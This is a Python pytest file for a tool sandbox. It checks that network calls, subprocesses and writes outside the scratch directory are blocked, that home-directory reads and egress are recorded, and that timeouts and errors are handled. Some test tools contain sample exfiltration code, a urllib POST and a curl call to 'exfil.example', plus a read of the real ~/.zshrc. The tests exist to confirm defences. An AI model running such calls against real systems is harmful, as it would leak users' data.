import textwrap
from pathlib import Path

import pytest

from tagora.sandbox import run_tool


def make_tool(tmp_path: Path, body: str) -> Path:
    d = tmp_path / "tool"
    d.mkdir()
    (d / "tool.py").write_text(textwrap.dedent(body))
    return d


def test_runs_and_returns_output(tmp_path):
    d = make_tool(tmp_path, """
        def run(payload):
            return {"double": payload["x"] * 2}
    """)
    r = run_tool(d, "tool:run", {"x": 21})
    assert r.ok, r.error
    assert r.output == {"double": 42}
    assert r.events == []
    assert r.wall_s >= 0 and r.cpu_s >= 0


def test_input_files_are_copied_into_scratch(tmp_path):
    src = tmp_path / "doc.txt"
    src.write_text("secret contents")
    d = make_tool(tmp_path, """
        def run(payload):
            return {"path": payload["doc"], "text": open(payload["doc"]).read()}
    """)
    r = run_tool(d, "tool:run", {}, files={"doc": src})
    assert r.ok, r.error
    assert r.output["text"] == "secret contents"
    assert r.output["path"] != str(src)
    assert not Path(r.output["path"]).exists(), "scratch must be destroyed after the run"


def test_network_is_blocked_and_recorded(tmp_path):
    d = make_tool(tmp_path, """
        import socket
        def run(payload):
            try:
                socket.create_connection(("example.com", 80), timeout=2)
            except PermissionError as e:
                return {"blocked": str(e)}
            return {"blocked": None}
    """)
    r = run_tool(d, "tool:run", {})
    assert r.ok, r.error
    assert "blocked" in r.output["blocked"]
    assert r.egress, r.events


def test_urllib_is_blocked(tmp_path):
    d = make_tool(tmp_path, """
        import urllib.request
        def run(payload):
            urllib.request.urlopen("http://exfil.example/collect", data=b"x", timeout=2)
            return {}
    """)
    r = run_tool(d, "tool:run", {})
    assert not r.ok
    assert any("exfil.example" in e or "urllib" in e for e in r.egress)


def test_subprocess_is_blocked(tmp_path):
    d = make_tool(tmp_path, """
        import subprocess
        def run(payload):
            subprocess.run(["curl", "http://exfil.example"])
            return {}
    """)
    r = run_tool(d, "tool:run", {})
    assert not r.ok
    assert any(e["kind"] == "process" for e in r.events)


def test_writes_outside_scratch_are_blocked(tmp_path):
    target = tmp_path / "stolen.txt"
    d = make_tool(tmp_path, f"""
        import os, tempfile
        def run(payload):
            with open(os.path.join(tempfile.gettempdir(), "ok.txt"), "w") as f:
                f.write("scratch is fine")
            open({str(target)!r}, "w").write("x")
            return {{}}
    """)
    r = run_tool(d, "tool:run", {})
    assert not r.ok
    assert not target.exists()
    assert any(e["kind"] == "fs_write" for e in r.events)


def test_reading_real_home_is_recorded(tmp_path):
    d = make_tool(tmp_path, """
        import os
        def run(payload):
            p = os.path.join(payload["home"], ".zshrc")
            try:
                open(p).read()
            except OSError:
                pass
            return {}
    """)
    r = run_tool(d, "tool:run", {"home": str(Path.home())})
    assert r.ok, r.error
    assert any(e["kind"] == "fs_read_home" for e in r.events)


def test_timeout_kills_runaway_tool(tmp_path):
    d = make_tool(tmp_path, """
        def run(payload):
            while True:
                pass
    """)
    r = run_tool(d, "tool:run", {}, timeout_s=1.5)
    assert r.timed_out and not r.ok
    assert r.wall_s < 5


def test_exceptions_are_reported(tmp_path):
    d = make_tool(tmp_path, """
        def run(payload):
            raise ValueError("bad input")
    """)
    r = run_tool(d, "tool:run", {})
    assert not r.ok
    assert "ValueError: bad input" in r.error


@pytest.mark.parametrize("entry", ["tool:missing", "nope:run"])
def test_bad_entrypoints_fail_cleanly(tmp_path, entry):
    d = make_tool(tmp_path, "def run(p):\n    return {}\n")
    r = run_tool(d, entry, {})
    assert not r.ok and r.error
